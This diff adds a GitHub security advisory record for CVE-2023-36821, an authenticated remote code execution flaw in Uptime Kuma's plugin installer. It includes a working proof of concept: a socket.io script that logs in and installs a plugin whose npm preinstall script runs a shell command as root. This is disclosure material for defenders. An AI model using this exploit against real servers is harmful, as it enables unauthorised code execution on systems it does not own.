@@ -1,0 +1,80 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-7grx-f945-mj96",
+  "modified": "2024-05-01T10:01:24Z",
+  "published": "2024-05-01T10:01:24Z",
+  "aliases": [
+    "CVE-2023-36821"
+  ],
+  "summary": "Uptime Kuma vulnerable to authenticated remote code execution via malicious plugin installation",
+  "details": "### Summary\nInstallation of a maliciously crafted plugin allows for remote code execution by an authenticated attacker.\n\n### Details\nUptime Kuma allows authenticated users to install plugins from an official list of plugins. This feature is currently disabled in the web interface, but the corresponding API endpoints are still available after login.\nAfter downloading a plugin, it's installed by calling `npm install` in the installation directory of the plugin:\nhttps://github.com/louislam/uptime-kuma/blob/8c60e902e1c76ecbbd1b0423b07ce615341cb850/server/plugins-manager.js#L210-L216\n\nBecause the plugin is not validated against the official list of plugins or installed with `npm install --ignore-scripts`, a maliciously crafted plugin taking advantage of [npm scripts](https://docs.npmjs.com/cli/v9/using-npm/scripts) can gain remote code execution.\n\n### PoC\nIn the PoC below, the plugin at https://github.com/n-thumann/npm-install-script-poc will be installed. It only consists of an empty `index.js` and a `package.json` containing the script: `\"preinstall\": \"echo \\\"Malicious code could have been executed as user $(whoami)\\\" > /tmp/poc\"`. This will be executed when installing the plugin.\n\n1. Start Uptime Kuma: `docker run -d -p 3001:3001 -v uptime-kuma:/app/data --name uptime-kuma louislam/uptime-kuma:1`\n2. Create a user using the Uptime Kuma web interface, e.g. user `admin` with password `admin123`\n3. Confirm that the PoC file to be created doesn't exist yet:\n```\n➜  ~ docker exec -it uptime-kuma cat /tmp/poc\ncat: /tmp/poc: No such file or directory\n```\n4. Create file `poc.js` with the following content:\n```\nSERVER = \"ws://localhost:3001\";\nUSERNAME = \"admin\";\nPASSWORD = \"admin123\";\n\n\nconst { io } = require(\"socket.io-client\");\nconst socket = io(SERVER);\nconst repo = \"https://github.com/n-thumann/npm-install-script-poc\";\nconst name = \"npm-install-script-poc\";\n\nsocket.emit(\n  \"login\",\n  { username: USERNAME, password: PASSWORD, token: \"\" },\n  (res) => {\n    if (res.ok !== true) return console.log(\"Login failed\");\n\n    console.log(\"Login successful\");\n    socket.emit(\"installPlugin\", repo, name, () => {\n      console.log(\"Done\");\n      socket.close();\n    });\n  }\n);\n```\n5. Install `socket.io-client`: `npm install socket.io-client`\n6. Run the script: `node poc.js`:\n```\n# node poc.js\nLogin successful\nDone\n```\n7. The PoC file has been created:\n```\n➜  ~ docker exec -it uptime-kuma cat /tmp/poc\nMalicious code could have been executed as user root\n```\n\n### Impact\nThis vulnerability allows authenticated attacker to gain remote code execution on the server Uptime Kuma is running on.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "uptime-kuma"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.22.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 1.22.0"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/louislam/uptime-kuma/security/advisories/GHSA-7grx-f945-mj96"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-36821"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/louislam/uptime-kuma/pull/3346"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/louislam/uptime-kuma/commit/a0736e04b2838aae198c2110db244eab6f87757b"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/louislam/uptime-kuma"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/louislam/uptime-kuma/blob/8c60e902e1c76ecbbd1b0423b07ce615341cb850/server/plugins-manager.js#L210-L216"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/louislam/uptime-kuma/releases/tag/1.22.1"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-20"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-05-01T10:01:24Z",
+    "nvd_published_at": "2023-07-05T22:15:09Z"
+  }
+}
